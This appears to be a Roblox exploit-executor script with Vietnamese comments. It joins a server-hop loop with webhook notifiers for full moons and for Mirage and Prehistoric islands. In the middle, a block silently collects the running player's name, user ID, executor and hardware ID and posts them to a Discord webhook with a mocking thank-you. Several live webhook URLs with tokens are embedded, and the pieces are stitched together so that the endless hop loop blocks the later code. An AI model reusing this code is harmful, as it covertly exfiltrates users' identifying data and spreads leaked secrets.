local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local PlaceID = game.PlaceId
local HopDelay = 1-- thời gian delay mỗi lần hop, tính bằng giây

-- Hàm lấy danh sách server
function GetServers()
    local Servers = {}
    local Cursor = ""
    local Success, Response

    repeat
        local URL = "https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?limit=100&sortOrder=Asc&cursor="..Cursor
        Success, Response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(URL))
        end)
        if Success and Response and Response.data then
            for _, Server in ipairs(Response.data) do
                if Server.playing < Server.maxPlayers and Server.id ~= game.JobId then
                    table.insert(Servers, Server.id)
                end
            end
            Cursor = Response.nextPageCursor or ""
        else
            break
        end
        wait(0.2)
    until Cursor == "" or not Success

    return Servers
end

-- Hàm hop server liên tục
function AutoHop()
    while true do
        local servers = GetServers()
        if #servers > 0 then
            local randomServer = servers[math.random(1, #servers)]
            TeleportService:TeleportToPlaceInstance(PlaceID, randomServer, player)
        else
            warn("Không tìm được server phù hợp, thử lại sau...")
        end
        wait(HopDelay)
    end
end

AutoHop()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

repeat wait() until game:IsLoaded()

local player = Players.LocalPlayer


local displayName = player.DisplayName
local username = player.Name
local userId = tostring(player.UserId)
local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)
local executor = identifyexecutor and identifyexecutor() or "Không xác định"
local hwid = gethwid and gethwid() or "Không lấy được"


local joinScript = string.format(
    'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
    placeId,
    jobId
)


local webhookUrl = "https://discord.com/api/webhooks/1380938876096610394/lWZBTIKe8xZOVJ71WZp9ngjHhcNbwE0Avprv6BZgREUpiP9rdzbW-aEaAhMZCMEWnh2a" 


local embed = {
    title = "Thông Tin Tài Khoản Roblox",
    color = 0x00FFFF, 
    fields = {
        { name = "Tên hiển thị", value = "`" .. displayName .. "`", inline = false },
        { name = " Tên người dùng", value = "`" .. username .. "`", inline = false },
        { name = " User ID", value = "`" .. userId .. "`", inline = false },
        { name = "Executor", value = "`" .. executor .. "`", inline = false },
        { name = " HWID", value = "`" .. hwid .. "`", inline = false },
        { name = " Place ID", value = "`" .. placeId .. "`", inline = false },
        { name = " Job ID", value = "`" .. jobId .. "`", inline = false },
        { name = " Script Hop", value = "```lua\n" .. joinScript .. "\n```", inline = false },
        { name = "✅ Trạng thái", value = "**+1 bé dùng script **\n🔥 *Cảm Ơn Chúng Mày*", inline = false }
    }
}


local payload = {
    embeds = {embed}
}

local requestFunc =
    (syn and syn.request) or
    (http and http.request) or
    (fluxus and fluxus.request) or
    (krnl and krnl.request)

if requestFunc then
    local success, err = pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("✅ Đã gửi webhook thành công!")
    else
        warn("❌ Lỗi gửi webhook:", err)
    end
else
    warn("❌ Executor không hỗ trợ HTTP Request!")
end


local webhookUrl = "https://discord.com/api/webhooks/1380937704925167666/m6Y9QI4NZ9qbRwukMTyxPEmIa-W10rb9hf7D8MdMl-8vTguL0xbdPf-vGDAmO868GfYd"


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")


if game.PlaceId ~= 7449423635 then return end


local alreadySent = false


local function getMoonTimer(phase)
    if phase == 5 then
        return "✅ **FULL MOON!**"
    elseif phase == 4 then
        return "🌑 **Sắp Trăng Tròn (~1 phút)**"
    elseif phase == 3 then
        return "🕒 **Còn ~2 phút nữa**"
    else
        return "⌛ **Còn lâu mới tới trăng tròn**"
    end
end


local function sendWebhook()
    local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
    local jobId = game.JobId
    local serverPlayerCount = #Players:GetPlayers()

    local message = {
        ["username"] = "PHUCMAX",
        ["embeds"] = {{
            ["title"] = "🌑 Full Moon Server Found [THIRD SEA]",
            ["color"] = 16776960,
            ["fields"] = {
                {
                    ["name"] = "⏳ Full Moon Status:",
                    ["value"] = getMoonTimer(moonPhase),
                    ["inline"] = true
                },
                {
                    ["name"] = "👥 Players:",
                    ["value"] = serverPlayerCount .. "/12",
                    ["inline"] = true
                },
                {
                    ["name"] = "🌑 Moon Phase:",
                    ["value"] = tostring(moonPhase) .. "/5",
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 JobId:",
                    ["value"] = "```" .. jobId .. "```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "PHUCMAX | " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.spawn(function()
    while true do
        local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
        if moonPhase == 5 and not alreadySent then
            sendWebhook()
            alreadySent = true
        elseif moonPhase ~= 5 then
            alreadySent = false
        end
        task.wait(10)
    end
end)

local objectName = "Mirage" 
local webhookUrl = "https://discord.com/api/webhooks/1380938550962556938/NY9VImFOcUSe8zwMdY68k0YHuwSHGzCrPFpeXlJVUIU_PQw6m4PkyO6VusHjHOoi3JEL" 


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId


local function getTimeOfDay()
    local time = tonumber(Lighting.ClockTime)
    if time >= 5 and time < 12 then
        return "☀️ Buổi sáng"
    elseif time >= 12 and time < 18 then
        return "🌤 Buổi chiều"
    else
        return "🌙 Buổi tối"
    end
end


local function sendWebhook()
    local message = {
        ["username"] = " phucmax Mirage Notify",
        ["embeds"] = {{
            ["title"] = "**phucmax Mirage Notify**",
            ["color"] = 16753920,
            ["fields"] = {
                {["name"] = " 🏝️Spawn:", ["value"] = "Mirage Island", ["inline"] = true},
                {["name"] = " 🕛Time Of Day:", ["value"] = getTimeOfDay(), ["inline"] = true},
                {["name"] = "👥 Players:", ["value"] = tostring(#Players:GetPlayers()) .. " players", ["inline"] = true},
                {["name"] = "🆔Job-Id:", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
            },
            ["footer"] = {
                ["text"] = "phucmax | " .. os.date("Hôm nay lúc %H:%M")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.wait(10) 
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("Model") then
        if v.Name:lower():find(objectName:lower()) then
            print("✅ Mirage Island được tìm thấy:", v:GetFullName())
            sendWebhook()
            break
        end
    end
end

local objectName = "Prehistoric" 
local webhookUrl = "https://discord.com/api/webhooks/1380938259282133074/4vz23EwIJzX36MS_I_JyVxaQLhJtgEBJITd83xt2pq41QHrLwFNnhcBLd66lfkmEWsEQ" 


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId


local function getTimeOfDay()
    local time = tonumber(Lighting.ClockTime)
    if time >= 5 and time < 12 then
        return "☀️ Buổi sáng"
    elseif time >= 12 and time < 18 then
        return "🌤 Buổi chiều"
    else
        return "🌙 Buổi tối"
    end
end


local function sendWebhook()
    local message = {
        ["username"] = " phucmax Prehistoric Notify",
        ["embeds"] = {{
            ["title"] = "**phucmax Prehistoric Notify**",
            ["color"] = 16753920,
            ["fields"] = {
                {["name"] = " 🌋Spawn:", ["value"] = "Prehistoric Island", ["inline"] = true},
                {["name"] = " 🕛Time Of Day:", ["value"] = getTimeOfDay(), ["inline"] = true},
                {["name"] = "👥 Players:", ["value"] = tostring(#Players:GetPlayers()) .. " players", ["inline"] = true},
                {["name"] = "🆔Job-Id:", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
            },
            ["footer"] = {
                ["text"] = "phucmax| " .. os.date("Hôm nay lúc %H:%M")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.wait(10) 
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("Model") then
        if v.Name:lower():find(objectName:lower()) then
            print("✅ Prehistoric Island được tìm thấy:", v:GetFullName())
            sendWebhook()
            break
        end
    end
end